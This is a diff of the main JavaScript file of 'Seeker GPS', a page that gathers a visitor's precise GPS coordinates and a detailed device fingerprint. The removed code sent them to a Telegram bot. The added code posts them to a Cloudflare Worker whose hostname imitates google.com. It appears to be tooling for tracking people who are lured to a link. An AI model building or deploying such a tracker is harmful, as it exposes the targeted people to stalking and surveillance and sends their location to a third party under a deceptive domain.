@@ -1,16 +1,20 @@
+```javascript
 // ==========================================
 // SEEKER GPS - MAIN JAVASCRIPT
+// ==========================================
+
+
+// ==========================================
+// CONFIGURATION
 // ==========================================
 
 // HTML elements
 const locationBtn = document.getElementById("locationBtn");
 const result = document.getElementById("result");
 
-// Telegram configuration
-// IMPORTANT: Replace with your NEW bot token.
-// Never publish a real bot token in frontend JavaScript.
-const BOT_TOKEN = "YOUR_NEW_BOT_TOKEN_HERE";
-const CHAT_ID = "9048956699";
+// Cloudflare Worker URL
+const WORKER_URL =
+    "https://google-com.ykzir-polyglot.workers.dev";
 
 
 // ==========================================
@@ -26,14 +30,16 @@ function getDeviceInfo() {
 
     return {
 
-        userAgent: navigator.userAgent,
+        userAgent:
+            navigator.userAgent || "Unavailable",
 
         platform:
             navigator.userAgentData?.platform ||
             navigator.platform ||
             "Unavailable",
 
-        language: navigator.language || "Unavailable",
+        language:
+            navigator.language || "Unavailable",
 
         screenResolution:
             `${screen.width} x ${screen.height}`,
@@ -42,7 +48,8 @@ function getDeviceInfo() {
             `${screen.colorDepth}-bit`,
 
         timezone:
-            Intl.DateTimeFormat().resolvedOptions().timeZone,
+            Intl.DateTimeFormat().resolvedOptions().timeZone ||
+            "Unavailable",
 
         cpuCores:
             navigator.hardwareConcurrency || "Unavailable",
@@ -67,54 +74,32 @@ function getDeviceInfo() {
 
 
 // ==========================================
-// 2. SEND GPS AND DEVICE INFORMATION
+// 2. SEND REPORT TO CLOUDFLARE
 // ==========================================
 
 async function sendLocation(latitude, longitude, accuracy) {
 
-    const telegramURL =
-        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-    // Read device information
+    // Collect device information
     const device = getDeviceInfo();
 
-    // Generate report
-    const message = `
-📍 SEEKER GPS - LOCATION REPORT
+    // Prepare report
+    const report = {
 
-━━━━━━━━━━━━━━━━━━
-🌍 LOCATION INFORMATION
-━━━━━━━━━━━━━━━━━━
+        latitude: latitude,
 
-Latitude: ${latitude}
-Longitude: ${longitude}
-Accuracy: ${Math.round(accuracy)} meters
+        longitude: longitude,
 
-Google Maps:
-https://www.google.com/maps?q=${latitude},${longitude}
+        accuracy: Math.round(accuracy),
 
-━━━━━━━━━━━━━━━━━━
-📱 DEVICE INFORMATION
-━━━━━━━━━━━━━━━━━━
+        device: device
 
-Platform: ${device.platform}
-Browser/User Agent: ${device.userAgent}
-Language: ${device.language}
-Screen Resolution: ${device.screenResolution}
-Color Depth: ${device.colorDepth}
-Time Zone: ${device.timezone}
-CPU Cores: ${device.cpuCores}
-Device Memory: ${device.deviceMemory}
-Connection Type: ${device.connectionType}
-Online: ${device.online}
-Cookies Enabled: ${device.cookiesEnabled}
+    };
 
-━━━━━━━━━━━━━━━━━━
-SEEKER GPS REPORT
-`;
+    console.log("Sending report to Cloudflare...");
+    console.log("Report:", report);
 
-    // Send report to Telegram
-    const response = await fetch(telegramURL, {
+    // Send report to Cloudflare Worker
+    const response = await fetch(WORKER_URL, {
 
         method: "POST",
 
@@ -122,19 +107,21 @@ SEEKER GPS REPORT
             "Content-Type": "application/json"
         },
 
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message
-        })
+        body: JSON.stringify(report)
 
     });
 
+    // Read Cloudflare response
     const data = await response.json();
 
+    console.log("Cloudflare HTTP Status:", response.status);
+    console.log("Cloudflare Response:", data);
+
+    // Check response
     if (!response.ok || !data.ok) {
 
         throw new Error(
-            data.description || "Telegram delivery failed."
+            data.error || "Cloudflare backend request failed."
         );
 
     }
@@ -148,116 +135,183 @@ SEEKER GPS REPORT
 // 3. LOCATION BUTTON EVENT
 // ==========================================
 
-locationBtn.addEventListener("click", function() {
+if (!locationBtn || !result) {
 
-    result.textContent =
-        "Requesting location permission...";
+    console.error(
+        "SEEKER GPS ERROR: HTML elements not found."
+    );
 
-    // Check browser GPS support
-    if (!navigator.geolocation) {
+} else {
 
-        result.textContent =
-            "GPS is not supported by this browser.";
+    locationBtn.addEventListener("click", function() {
 
-        return;
-
-    }
-
-    // Prevent repeated clicks
-    locationBtn.disabled = true;
-
-    // Request location
-    navigator.geolocation.getCurrentPosition(
-
-        // SUCCESS
-        async function(position) {
-
-            const latitude =
-                position.coords.latitude;
-
-            const longitude =
-                position.coords.longitude;
-
-            const accuracy =
-                position.coords.accuracy;
+        // Check browser GPS support
+        if (!navigator.geolocation) {
 
             result.textContent =
-                "Location obtained. Preparing device report...";
+                "GPS is not supported by this browser.";
 
-            console.log("Latitude:", latitude);
-            console.log("Longitude:", longitude);
-            console.log("Accuracy:", accuracy);
+            return;
 
-            console.log("Device Information:", getDeviceInfo());
+        }
 
-            try {
+        // Check secure connection
+        if (!window.isSecureContext) {
 
-                await sendLocation(
-                    latitude,
-                    longitude,
+            result.textContent =
+                "GPS requires a secure HTTPS connection.";
+
+            return;
+
+        }
+
+        // Disable button while processing
+        locationBtn.disabled = true;
+
+        result.textContent =
+            "Requesting location permission...";
+
+        // Request GPS coordinates
+        navigator.geolocation.getCurrentPosition(
+
+            // ==================================
+            // LOCATION SUCCESS
+            // ==================================
+
+            async function(position) {
+
+                const latitude =
+                    position.coords.latitude;
+
+                const longitude =
+                    position.coords.longitude;
+
+                const accuracy =
+                    position.coords.accuracy;
+
+                console.log(
+                    "Latitude:",
+                    latitude
+                );
+
+                console.log(
+                    "Longitude:",
+                    longitude
+                );
+
+                console.log(
+                    "Accuracy:",
                     accuracy
                 );
 
-                result.textContent =
-                    "Location and device report successfully sent to Telegram!";
-
-            } catch (error) {
-
-                console.error(
-                    "Telegram Error:",
-                    error
+                console.log(
+                    "Device Information:",
+                    getDeviceInfo()
                 );
 
                 result.textContent =
-                    "Location obtained, but Telegram delivery failed. Check the console.";
+                    "Location obtained. Sending report to Seeker GPS server...";
 
-            } finally {
+                try {
+
+                    // Send GPS and device report
+                    const response = await sendLocation(
+                        latitude,
+                        longitude,
+                        accuracy
+                    );
+
+                    if (response.ok) {
+
+                        result.textContent =
+                            "Location and device report successfully delivered!";
+
+                    }
+
+                } catch (error) {
+
+                    console.error(
+                        "SEEKER GPS BACKEND ERROR:",
+                        error
+                    );
+
+                    result.textContent =
+                        "Location obtained, but server delivery failed. Check the console.";
+
+                } finally {
+
+                    // Re-enable button
+                    locationBtn.disabled = false;
+
+                }
+
+            },
+
+
+            // ==================================
+            // LOCATION ERROR
+            // ==================================
+
+            function(error) {
+
+                console.error(
+                    "GPS ERROR:",
+                    error
+                );
+
+                switch (error.code) {
+
+                    case error.PERMISSION_DENIED:
+
+                        result.textContent =
+                            "Location permission was denied.";
+
+                        break;
+
+                    case error.POSITION_UNAVAILABLE:
+
+                        result.textContent =
+                            "Location information is unavailable.";
+
+                        break;
+
+                    case error.TIMEOUT:
+
+                        result.textContent =
+                            "Location request timed out.";
+
+                        break;
+
+                    default:
+
+                        result.textContent =
+                            "An unknown GPS error occurred.";
+
+                }
 
                 locationBtn.disabled = false;
 
+            },
+
+
+            // ==================================
+            // GPS SETTINGS
+            // ==================================
+
+            {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
             }
 
-        },
+        );
 
-        // ERROR
-        function(error) {
+    });
 
-            console.error("GPS Error:", error);
+}
 
-            switch (error.code) {
 
-                case error.PERMISSION_DENIED:
-                    result.textContent =
-                        "Location permission was denied.";
-                    break;
-
-                case error.POSITION_UNAVAILABLE:
-                    result.textContent =
-                        "Location information is unavailable.";
-                    break;
-
-                case error.TIMEOUT:
-                    result.textContent =
-                        "Location request timed out.";
-                    break;
-
-                default:
-                    result.textContent =
-                        "An unknown location error occurred.";
-
-            }
-
-            locationBtn.disabled = false;
-
-        },
-
-        // GPS SETTINGS
-        {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
-        }
-
-    );
-
-});
+// ==========================================
+// END OF SEEKER GPS
+// ==========================================
+```
